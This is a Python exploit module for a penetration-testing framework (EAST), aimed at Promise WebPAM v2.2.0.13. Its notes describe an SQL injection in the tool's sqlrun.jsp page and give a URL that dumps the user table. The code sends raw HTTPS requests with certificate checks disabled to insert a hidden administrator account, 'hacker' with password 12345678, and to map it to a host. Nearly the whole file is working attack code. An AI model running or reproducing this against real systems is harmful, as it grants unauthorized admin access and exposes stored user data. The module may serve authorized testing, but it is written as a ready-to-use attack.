#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import ssl
import socket


sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_promise_webpam"
INFO['DESCRIPTION'] = "Promise WebPAM v2.2.0.13 Add admin user"
INFO['VENDOR'] = "http://promise.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = 'http://www.exploit-db.com/exploits/18571/'
INFO["CVE Name"] = ""
INFO["NOTES"] = """
WebPAM is a web based Promise Array Management Software
that's easy-to use, designed to simplify RAID storage management.
WebPAM is specifically designed for Promise HBA. WebPAM can configure,
manage or monitor Promise RAID products remotely from a web browser
from anywhere in the world.

Vulnerability Details: 
WebPAM is a web based Promise Array Management Software
that's easy-to use, designed to simplify RAID storage management.
WebPAM is specifically designed for Promise HBA. WebPAM can configure,
manage or monitor Promise RAID products remotely from a web browser
from anywhere in the world.
Desc: Input passed via the parameters 'entSortOrder' and 'entSort' in
'ent_i.jsp' script are not properly sanitised before being returned to
the user or used in SQL queries. This can be exploited to manipulate SQL
queries by injecting arbitrary SQL code.

Vor view current users enter command:

https://[host]:8443/promise/tools/sqlrun.jsp?sqlstr=SELECT%20*%20from%20USERDATA;
"""

INFO['CHANGELOG'] = "12 Mar, 2012. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"
OPTIONS["PORT"] = 8443


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.basepath = ''
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return
    
    
    def run(self):
        self.args()
        self.log('Try to add admin user: hacker/12345678')
        
        injection_string = "/promise/tools/sqlrun.jsp?sqlstr=INSERT%20INTO%20USERDATA%20VALUES('hacker','Super%20user','fCIvspJ9goryL1khNOiTJIBjfA0=','');"
        pktsnd = "GET " + injection_string + " HTTP 1.1\r\n\r\n"
        injection_string = "/promise/tools/sqlrun.jsp?sqlstr=INSERT%20INTO%20USERHOSTMAP%20VALUES('hacker','127.0.0.1',1,1,1,1);"
        pktsnd2 = "GET " + injection_string + " HTTP 1.1\r\n\r\n"

        try:
            sock = socket.socket()
            ssl_sock = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1)
            ssl_sock.connect((self.host, self.port))
            ssl_sock.write(pktsnd)
            sock.close()
            
            sock = socket.socket()
            ssl_sock = ssl.wrap_socket(sock, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1)
            ssl_sock.connect((self.host, self.port))
            ssl_sock.write(pktsnd2)
            sock.close()

            self.log("response received. Enter Login:hacker Password:12345678")
            self.finish(True)
        except Exception as e:
            self.log("Failed. {}".format(e))
            self.finish(False)
            
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
    